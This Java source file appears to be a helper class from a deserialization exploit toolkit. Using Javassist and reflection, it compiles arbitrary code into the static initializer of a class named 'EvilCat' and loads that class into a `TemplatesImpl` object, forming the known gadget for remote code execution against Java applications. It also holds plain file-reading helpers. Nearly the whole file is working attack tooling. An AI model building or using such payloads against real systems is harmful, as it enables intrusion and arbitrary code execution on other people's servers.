import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class Utils {
    private static TemplatesImpl newTemplatesWithClassBytes(byte[] classBytes) throws Exception {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        // 进入 defineTransletClasses() 方法需要的条件
        Reflections.setFieldValue(templates, "_name", "name" + System.nanoTime());
        Reflections.setFieldValue(templates, "_class", null);
        Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        return templates;
    }
    public static TemplatesImpl generateTemplates(String code) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        // 创建 static 代码块，并插入代码
        cc.makeClassInitializer().insertBefore(code);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        // 转换为bytes
        byte[] classBytes = cc.toBytecode();
        return newTemplatesWithClassBytes(classBytes);
    }

    public static TemplatesImpl generateTemplates(byte[] classBytes) throws Exception {
        return newTemplatesWithClassBytes(classBytes);
    }

    public static String readFiletoString(String fileName) throws IOException {
        return new String(readFileToBytes(fileName), "utf-8");
    }

    public static byte[] readFileToBytes(String fileName) throws IOException {
        String encoding = "utf-8";
        File file = new File(fileName);
        Long filelength = file.length();
        byte[] filecontent = new byte[filelength.intValue()];
        FileInputStream in = new FileInputStream(file);
        in.read(filecontent);
        in.close();
        return filecontent;
    }
}
